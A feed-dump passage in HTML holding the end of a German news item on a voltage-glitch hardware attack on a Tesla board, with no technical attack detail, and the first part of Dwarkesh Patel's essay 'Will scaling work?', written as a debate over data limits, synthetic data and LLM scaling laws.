													<path d="M14.7225919,7.40526466 L12.4639861,9.66387039 C12.5380387,8.81226499 12.4269598,7.97917266 12.1307492,7.18310673 L13.3155915,5.97975122 C14.2227365,5.0726063 14.2227365,3.59155336 13.3155915,2.68440844 C12.4084466,1.77726352 10.9273937,1.77726352 10.0202488,2.68440844 L7.52097193,5.16517211 C6.61382699,6.09083019 6.61382699,7.55336999 7.52097193,8.47902806 C7.92826146,8.86780446 7.92826146,9.49725192 7.52097193,9.88602832 C7.13219553,10.2748047 6.50274806,10.2748047 6.11397166,9.88602832 C4.42927394,8.18281746 4.42927394,5.44286953 6.11397166,3.75817182 L8.59473532,1.27740816 C10.2979462,-0.425802719 13.0378941,-0.425802719 14.7225919,1.27740816 C16.4258027,2.96210587 16.4258027,5.7020538 14.7225919,7.40526466 Z M9.89065666,12.2371999 L7.39137979,14.7364767 C5.70668209,16.4211744 2.96673416,16.4211744 1.26352329,14.7364767 C-0.421174428,13.0332659 -0.421174428,10.2933179 1.26352329,8.60862019 L3.54064217,6.33150133 C3.46658952,7.18310673 3.5776685,8.03471219 3.87387908,8.83077812 L2.68903674,10.0156205 C1.78189181,10.9227654 1.78189181,12.4038183 2.68903674,13.3109633 C3.59618166,14.2181082 5.07723459,14.2181082 5.98437951,13.3109633 L8.46514319,10.8301996 C9.39080126,9.92305466 9.39080126,8.44200172 8.46514319,7.53485679 C8.07636679,7.14608039 8.07636679,6.49811973 8.46514319,6.10934333 C8.85391959,5.72056696 9.50188026,5.72056696 9.89065666,6.10934333 C11.5753543,7.81255426 11.5753543,10.5525022 9.89065666,12.2371999 Z" id="Icon_URL"></path>
												</g>
											</g>
										</svg>
									</a>Kaum Gefahr für Privatnutzer</span></h2>	
						</p>
<p>Die Funde seien laut Bericht kein Grund zur Sorge für Privatnutzer:innen. Um die Platine zu infiltrieren, brauchen potenzielle Angreifer:innen Zugriff auf das Bauteil. Es müsste also ausgebaut werden. In der Theorie ist sowas höchstens in Werkstätten möglich.</p>
<p>Verwundert waren die Doktoranden vor allem von der Tatsache, wie einfach sie auf Teslas Firmengeheimnisse zugreifen konnten. Auch Konkurrenten dürften auf diese Weise Erkenntnisse für eigene E-Autos erlangen. Grundsätzlich attestierten die drei dem Unternehmen eine gute Sicherheit. Nur gegen die durchgeführten Voltage-Glitch-Angriffe, wie sie die Doktoranden durchgeführt haben, ist das Unternehmen offenbar nicht gut gewappnet.</p><p><img src="https://ssl-vg03.met.vgwort.de/na/72594d3b981b4b3ea4e343c241ee8b06" width="1" height="1" alt=""></p>
                                                            
                                                                                        
                            
                                                            
                            
                            
                                    
    <div id="digitaletransformation">
                                    <p>
                        Verpasse keine News zu Digitale Transformation <span>💌</span>
                    </p>
                                <form novalidate="">
                    <div>
                        <p>
                            Bitte gib eine gültige E-Mail-Adresse ein.
                        </p>
                        </div>
                    <p>
                        Es gab leider ein Problem beim Absenden des Formulars. Bitte versuche es erneut.
                    </p>
                    <p>
                        Bitte gib eine gültige E-Mail-Adresse ein.
                    </p>
                </form>
                <p>
                    <a href="https://t3n.de/datenschutz/" title="Hinweis zum Newsletter &amp; Datenschutz" target="_blank">Hinweis zum Newsletter &amp; Datenschutz</a>
                </p>
            </div>

                                                    </div>
                    </div>
        </article>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Will scaling work? (203 pts)]]></title>
            <link>https://www.dwarkeshpatel.com/p/will-scaling-work</link>
            <guid>38781484</guid>
            <pubDate>Wed, 27 Dec 2023 12:54:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.dwarkeshpatel.com/p/will-scaling-work">https://www.dwarkeshpatel.com/p/will-scaling-work</a>, See on <a href="https://news.ycombinator.com/item?id=38781484">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><p>When should we expect AGI?&nbsp;</p><p>If we can keep scaling LLMs++ (and get better and more general performance as a result), then there’s reason to expect powerful AIs by 2040 (or much sooner) which can automate most cognitive labor and speed up further AI progress. However, if scaling doesn’t work, then the path to AGI seems much longer and more intractable, for reasons I explain in the post.</p><p>In order to think through both the pro and con arguments about scaling, I wrote the post as a debate between two characters I made up - Believer and Skeptic. </p><p><strong>Skeptic:</strong></p><p><span>We’re about to </span><a href="https://epochai.org/blog/will-we-run-out-of-ml-data-evidence-from-projecting-dataset" rel="">run out of high quality language data</a><span> next year.</span></p><p><span>Even taking handwavy scaling curves seriously implies that we’ll need </span><a href="https://epochai.org/blog/the-direct-approach" rel="">1e35 FLOPs</a><span> for an AI that is reliable and smart enough to write a scientific paper (that’s table stakes for the abilities an AI would need to automate further AI research and continue progress once scaling becomes infeasible)</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-139936826" href="https://www.dwarkeshpatel.com/p/will-scaling-work#footnote-1-139936826" target="_self" rel="">1</a></span><span>. Which means we need 5 OOMs (orders of magnitude) more data than we seem to have</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-139936826" href="https://www.dwarkeshpatel.com/p/will-scaling-work#footnote-2-139936826" target="_self" rel="">2</a></span><span>.</span></p><p>I’m worried that when people hear ‘5 OOMs off’, how they register it is, “Oh we have 5x less data than we need - we just need a couple of 2x improvements in data efficiency, and we’re golden”. After all, what’s a couple OOMs between friends?</p><p><span>No, 5 OOMs off means we have 100,000x less data than we need. Yes, we’ll get slightly more data efficient algorithms. And multimodal training will give us more data, plus we can </span><a href="https://twitter.com/rasbt/status/1663534498905051144" rel="">recycle tokens</a><span> on multiple epochs and use </span><a href="https://arxiv.org/abs/2108.02170" rel="">curriculum learning</a><span>. But even if we assume the most generous possible one-off improvements that these techniques are likely to give, they do not grant us the exponential increase in data required to keep up with the exponential increase in compute demanded by these scaling laws.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37c7cd9d-650c-4dfe-b115-117d3dd4a809_802x632.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37c7cd9d-650c-4dfe-b115-117d3dd4a809_802x632.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37c7cd9d-650c-4dfe-b115-117d3dd4a809_802x632.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37c7cd9d-650c-4dfe-b115-117d3dd4a809_802x632.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37c7cd9d-650c-4dfe-b115-117d3dd4a809_802x632.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37c7cd9d-650c-4dfe-b115-117d3dd4a809_802x632.png" width="526" height="414.50374064837905" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/37c7cd9d-650c-4dfe-b115-117d3dd4a809_802x632.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:632,&quot;width&quot;:802,&quot;resizeWidth&quot;:526,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37c7cd9d-650c-4dfe-b115-117d3dd4a809_802x632.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37c7cd9d-650c-4dfe-b115-117d3dd4a809_802x632.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37c7cd9d-650c-4dfe-b115-117d3dd4a809_802x632.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37c7cd9d-650c-4dfe-b115-117d3dd4a809_802x632.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>So then people say, we’ll get self-play/synthetic data working somehow. But self-play has two very difficult challenges</p><ul><li><p><strong>Evaluation:</strong><span> Self play worked with AlphaGo since the model could judge itself based on a concrete win condition (“Did I win this game of Go?”). But novel reasoning doesn’t have a concrete win condition. And as a result, just as you would expect, LLMs are incapable so far of </span><a href="https://arxiv.org/pdf/2310.01798.pdf" rel="">correcting their own reasoning</a><span>.</span></p></li><li><p><strong>Compute:</strong><span> All these math/code approaches tend to use various sorts of tree search, where you run an LLM at each node repeatedly. AlphaGo’s compute budget is </span><a href="https://www.yuzeh.com/data/agz-cost.html" rel="">staggering</a><span> for the relatively circumscribed task of winning at Go - now imagine that instead of searching over the space of Go moves - you need to search over the space of all possible human thought. All this extra compute needed to get self-play to work is in addition to the stupendous compute increase already required to scale the parameters themselves (compute = parameters * data). Using the 1e35 FLOP estimate for human-level thought, we need 9 OOMs more compute atop the </span><a href="https://epochai.org/trends" rel="">biggest models</a><span> we have today. Yes, you’ll get improvements from better hardware and better algorithms, but will you really get a full equivalent of 9 OOMs?</span></p></li></ul><p><strong>Believer:</strong></p><p>If your main objection to scale working is just the lack of data, your intuitive reaction should not be, “Well it looks we could have produced AGI by scaling up a transformer++, but I guess we’re gonna run out of data first.”&nbsp;</p><p><span>Your reaction should be, “Holy fuck, if the internet was a lot bigger, scaling up a model whose basic structure I could write in a </span><a href="https://github.com/karpathy/minGPT" rel="">few hundred lines</a><span> of Python code would have produced a human level mind. It's a crazy fact about the world that it’s this easy to make big-blobs-of-compute intelligent.</span></p><p><span>The sample over which LLMs are ‘inefficient’ is mostly just irrelevant e-commerce junk</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-139936826" href="https://www.dwarkeshpatel.com/p/will-scaling-work#footnote-3-139936826" target="_self" rel="">3</a></span><span>.  We compound this disability by training them on predicting the next-token - a loss function which is mostly unrelated to the actual tasks we want intelligent agents to do in the economy. And despite this miniscule intersection between the abilities we actually want and the terrible loss function and data we train these models with, we can produce a baby-AGI (aka GPT-4) by throwing just </span><a href="https://the-decoder.com/gpt-4-architecture-datasets-costs-and-more-leaked/" rel="">00.03%</a><span> of </span><a href="https://companiesmarketcap.com/microsoft/revenue" rel="">Microsoft’s yearly revenues</a><span> at a big scrape of the internet.</span></p><p><span>So given how easy and simple AI progress has been so far, we shouldn’t be surprised if synthetic data also just works. After all, </span><a href="https://twitter.com/dwarkesh_sp/status/1735346394779750877" rel="">“the models just want to learn”</a><span>.</span></p><p><span>GPT-4 has been out for all of 8 months. The other AI labs have only just gotten their own GPT-4 level models. Which means all the researchers are only now getting around to making self-play work with current generation models (and it seems like one of them might have already </span><a href="https://www.interconnects.ai/p/q-star" rel="">succeeded</a><span>). Therefore, the fact that so far we don’t have public evidence that synthetic data has worked at scale doesn’t mean it can’t.&nbsp;</span></p><p>After all, RL becomes much more feasible when your base model is capable enough to get the right answer at least some of the time (now you can reward that 1/100 times that the model accomplishes the chain of thought required for an extended math proof, or writes the 500 lines of code needed to complete a full pull request). Soon your 1/100 success rate becomes 10/100, then 90/100. Now you try the 1000 line pull requests, and not only will the model sometimes succeed, but it’ll be able to critique itself when it fails. And so on.&nbsp;&nbsp;</p><p><span>In fact, this synthetic data bootstrapping seems almost directly analogous to human evolution. Our primate ancestors </span><a href="https://pigeon.psy.tufts.edu/psych26/kohler.htm" rel="">show little evidence</a><span> of being able to rapidly discern and apply new insights.&nbsp; But once humans develop language, you have this </span><a href="https://www.amazon.com/Symbolic-Species-Co-evolution-Language-Brain/dp/0393317544" rel="">genetic/cultural coevolution</a><span> which is very similar to the synthetic data/self play loop for LLMs, where the model gets smarter in order to better make sense of the complex symbolic outputs of similar copies.</span></p><p><span>Self play doesn’t require models to be perfect at judging their own reasoning. They just have to be better at evaluating reasoning than at doing it de novo (which clearly already seems to be the case - see </span><a href="https://www.anthropic.com/index/constitutional-ai-harmlessness-from-ai-feedback" rel="">Constitutional AI</a><span>, or just play around GPT for a few minutes, and notice that it seems better at explaining why what you wrote down is wrong than it is at coming up with the right answer by itself)</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-4-139936826" href="https://www.dwarkeshpatel.com/p/will-scaling-work#footnote-4-139936826" target="_self" rel="">4</a></span><span>.&nbsp;</span></p><p><span>Almost all the researchers I talk to in the big AI labs are quite confident they’ll get self-play to work. And when I ask why they’re so sure, they heave for a moment, as if they’re bursting to explain all their ideas. But then they remember that confidentiality is a thing, and say, “I can’t tell you specifics, but there’s so much low hanging fruit in terms of what we can try here.” Or as </span><a href="https://www.dwarkeshpatel.com/p/dario-amodei" rel="">Dario Amodei (CEO of Anthropic) told me on my podcast</a><span>:</span></p><blockquote><p><strong>Dwarkesh Patel</strong><span> (00:10:01 - 00:10:06):</span></p><p>You mentioned that data is likely not to be the constraint. Why do you think that is the case?</p><p><strong>Dario Amodei</strong><span> (00:10:06 - 00:10:22):</span></p><p>There's various possibilities here and for a number of reasons I shouldn't go into the details, but there's many sources of data in the world and there's many ways that you can also generate data. My guess is that this will not be a blocker.</p><p>Maybe it would be better if it was, but it won't be.</p></blockquote><p><strong>Skeptic:</strong></p><p>Constitutional AI, RLHF and other RL/self-play setups are good at bringing out latent capabilities (or suppressing them when the capabilities are naughty). But no one has demonstrated a method to actually increase the model’s underlying abilities with RL.&nbsp;</p><p>If some kind of self-play/synthetic data doesn’t work, you’re absolutely fucked - there’s no other way around the data bottleneck. A new architecture is extremely unlikely to provide a fix. You would need a jump in sample efficiency much bigger than even LSTMs to transformers. And LSTMs were invented all the way back in the 90s. So you’d need a bigger jump than we have gotten from over 20 years when all the low hanging fruit in deep learning has been most accessible.&nbsp;</p><p>The vibes you’re receiving from people who have an emotional or financial interest in seeing LLMs scale can’t substitute for the complete lack of evidence we have that RL can fix the many OOMs shortfall in data.</p><p>Furthermore, the fact that LLMs seem to need such a stupendous amount of data to get such mediocre reasoning indicates that they simply are not generalizing. If these models can’t get anywhere close to human level performance with the data a human would see in 20,000 years, we should entertain the possibility that 2,000,000,000 years worth of data will be also be insufficient. There’s no amount of jet fuel you can add to an airplane to make it reach the moon.</p><p><strong>Believer:</strong></p><p>What are you talking about? Performance on benchmarks has scaled consistently for 8 orders of magnitude. The loss in model performance has been precise down to many decimal places over million fold increases in compute.&nbsp;</p><p><span>In the </span><a href="https://ar5iv.labs.arxiv.org/html/2303.08774" rel="">GPT-4 technical report</a><span>, they say that they were able to predict the performance of the final GPT-4 model “from models trained using the same methodology but using at most 10,000x less compute than GPT-4.”</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6e64582-6aa4-4dad-8850-7d2392433b0e_1328x830.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6e64582-6aa4-4dad-8850-7d2392433b0e_1328x830.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6e64582-6aa4-4dad-8850-7d2392433b0e_1328x830.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6e64582-6aa4-4dad-8850-7d2392433b0e_1328x830.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6e64582-6aa4-4dad-8850-7d2392433b0e_1328x830.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6e64582-6aa4-4dad-8850-7d2392433b0e_1328x830.png" width="1328" height="830" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f6e64582-6aa4-4dad-8850-7d2392433b0e_1328x830.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:830,&quot;width&quot;:1328,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6e64582-6aa4-4dad-8850-7d2392433b0e_1328x830.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6e64582-6aa4-4dad-8850-7d2392433b0e_1328x830.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6e64582-6aa4-4dad-8850-7d2392433b0e_1328x830.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6e64582-6aa4-4dad-8850-7d2392433b0e_1328x830.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>We should assume that a trend which has worked so consistently for the last 8 OOMs will be reliable for the next 8. And the performance which we would achieve from a further 8 OOM scaleup (or what would in performance terms be equivalent to an 8 OOM scaleup given the free performance boosts you get from algorithmic and hardware progress) would likely result in models that are capable enough to speed up AI research.</p><p><strong>Skeptic:</strong></p><p>But of course we don’t actually care directly about performance on next-token prediction. The models already have humans beat on this loss function. We want to find out whether these scaling curves on next-token prediction actually correspond to true progress towards generality.</p><p><strong>Believer:</strong></p><p><span>As you scale these models, their performance consistently and reliably improves on a broad range of tasks as measured by benchmarks like </span><a href="https://paperswithcode.com/dataset/mmlu" rel="">MMLU</a><span>, </span><a href="https://paperswithcode.com/dataset/big-bench" rel="">BIG-bench</a><span>, and </span><a href="https://paperswithcode.com/dataset/humaneval" rel="">HumanEval</a><span>.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Febb57ffe-0b69-471f-be63-6dfa70529f49_1329x823.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Febb57ffe-0b69-471f-be63-6dfa70529f49_1329x823.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Febb57ffe-0b69-471f-be63-6dfa70529f49_1329x823.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Febb57ffe-0b69-471f-be63-6dfa70529f49_1329x823.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Febb57ffe-0b69-471f-be63-6dfa70529f49_1329x823.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Febb57ffe-0b69-471f-be63-6dfa70529f49_1329x823.png" width="524" height="324.4936042136945" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/ebb57ffe-0b69-471f-be63-6dfa70529f49_1329x823.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:823,&quot;width&quot;:1329,&quot;resizeWidth&quot;:524,&quot;bytes&quot;:96751,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Febb57ffe-0b69-471f-be63-6dfa70529f49_1329x823.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Febb57ffe-0b69-471f-be63-6dfa70529f49_1329x823.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Febb57ffe-0b69-471f-be63-6dfa70529f49_1329x823.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Febb57ffe-0b69-471f-be63-6dfa70529f49_1329x823.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52857dc-fd8e-42bf-b556-879ef296874a_1600x1060.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52857dc-fd8e-42bf-b556-879ef296874a_1600x1060.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52857dc-fd8e-42bf-b556-879ef296874a_1600x1060.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52857dc-fd8e-42bf-b556-879ef296874a_1600x1060.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52857dc-fd8e-42bf-b556-879ef296874a_1600x1060.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52857dc-fd8e-42bf-b556-879ef296874a_1600x1060.png" width="528" height="349.94505494505495" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/d52857dc-fd8e-42bf-b556-879ef296874a_1600x1060.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:965,&quot;width&quot;:1456,&quot;resizeWidth&quot;:528,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52857dc-fd8e-42bf-b556-879ef296874a_1600x1060.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52857dc-fd8e-42bf-b556-879ef296874a_1600x1060.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52857dc-fd8e-42bf-b556-879ef296874a_1600x1060.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52857dc-fd8e-42bf-b556-879ef296874a_1600x1060.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F11f75c39-8209-46a0-bcc4-d25ceda5312a_1600x1058.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F11f75c39-8209-46a0-bcc4-d25ceda5312a_1600x1058.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F11f75c39-8209-46a0-bcc4-d25ceda5312a_1600x1058.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F11f75c39-8209-46a0-bcc4-d25ceda5312a_1600x1058.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F11f75c39-8209-46a0-bcc4-d25ceda5312a_1600x1058.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F11f75c39-8209-46a0-bcc4-d25ceda5312a_1600x1058.png" width="496" height="328.05494505494505" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/11f75c39-8209-46a0-bcc4-d25ceda5312a_1600x1058.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:963,&quot;width&quot;:1456,&quot;resizeWidth&quot;:496,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F11f75c39-8209-46a0-bcc4-d25ceda5312a_1600x1058.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F11f75c39-8209-46a0-bcc4-d25ceda5312a_1600x1058.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F11f75c39-8209-46a0-bcc4-d25ceda5312a_1600x1058.png 1272w, 